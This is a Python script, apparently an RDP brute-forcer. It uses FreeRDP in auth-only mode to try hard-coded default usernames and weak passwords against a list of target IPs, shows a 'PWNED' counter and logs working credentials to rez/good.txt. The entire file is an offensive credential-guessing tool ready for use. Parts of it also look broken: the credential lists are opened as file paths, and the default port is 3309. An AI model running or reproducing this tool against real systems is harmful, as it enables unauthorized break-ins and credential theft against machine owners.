import asyncio
from asyncio import create_subprocess_exec as run
from asyncio.subprocess import DEVNULL
from collections.abc import AsyncGenerator
from platform import system as sys_ver

from aiofiles import open as afile
from async_timeout import timeout as ftime
import sys

uuser="""
admin
user
administrator
"""

ppasswd="""
12345678
123456
00000000
"""



# OS Detect
if sys_ver() == 'Windows':
    APP = 'wfreerdp.exe'
else:
    APP = 'xfreerdp'


class RDP_Checker:
    __slots__ = ('good', 'total', 'threads', 'port', 'timeout')

    def __init__(self):
        self.good = 0
        self.total = 0

        self.threads = int(input('Threads: ') or 1)
        self.port = int(input('Port: ') or 3309)
        self.timeout = int(input('Timeout: ') or 10)

        print('PWNED | TOTAL')

    def __stats__(self, last: bool = False) -> None:
        print(f'{self.good} | {self.total}', end='\n' if last else '\r')

    def kill(self, pid: int) -> list:
        if sys_ver() == 'Windows':
            return f'taskkill /PID {pid} /F'.split(' ')
        else:
            return f'kill -9 {pid}'.split(' ')

    async def __extra_kill__(self, pid: str):
        a = await run(*self.kill(pid), limit=0, stdout=DEVNULL, stderr=DEVNULL)
        await a.communicate()

    async def __read_file__(self, file: str) -> AsyncGenerator:
        async with afile(file, errors="ignore", encoding="utf-8") as lines:
            async for line in lines:
                yield line.strip()

    async def __save__(self, data: str) -> None:
        async with afile(f'rez/good.txt', 'a', encoding='utf-8',
                         errors='ignore') as f:
            await f.write(data)

    async def connect(self, ip: str, user: str, password: str) -> None:
        # Arguments for run FreeRDP
        r_agr = [
            f"/v:{ip} ",  # IP for connect
            f"/port:{self.port} ",  # Base port for connect
            f"/u:'{user}' ",  # Username param
            f"/p:'{password}' ",  # Password param, !doesn't work with empty!
            "/cert-ignore ",  # Ignore cert errors
            "+auth-only ",  # Says: "We want only login and outing"
            "+compression ",  # Using some compression for cut traffic
            "/sec:nla"  # Default
        ]

        a = await run(APP, *r_agr, limit=0, stdout=DEVNULL, stderr=DEVNULL)

        try:
            async with ftime(self.timeout):
                await a.communicate()

            assert a.returncode == 0
            await self.__save__(f'{ip}:{self.port};{user}:{password}\n')

            self.good += 1
        except asyncio.TimeoutError:
            await self.__extra_kill__(a.pid)
        except AssertionError:
            pass
        finally:
            self.total += 1

    async def main(self) -> None:
        tasks = []

        async for user in self.__read_file__(uuser):
            async for passw in self.__read_file__(ppasswd):
                async for ip in self.__read_file__(sys.argv[1]):
                    tasks.append(asyncio.ensure_future(self.connect(
                        ip,
                        user,
                        passw
                    )))

                    if len(tasks) == self.threads:
                        await asyncio.gather(*tasks)
                        self.__stats__()
                        tasks.clear()

        self.__stats__(True)

        if len(tasks) != 0:
            await asyncio.gather(*tasks)


if __name__ == "__main__":
    if sys_ver() == 'Windows':
        loop = asyncio.ProactorEventLoop()
        asyncio.set_event_loop(loop)
    else:
        loop = asyncio.get_event_loop()

    action = RDP_Checker()
    loop.run_until_complete(action.main())
    loop.close()
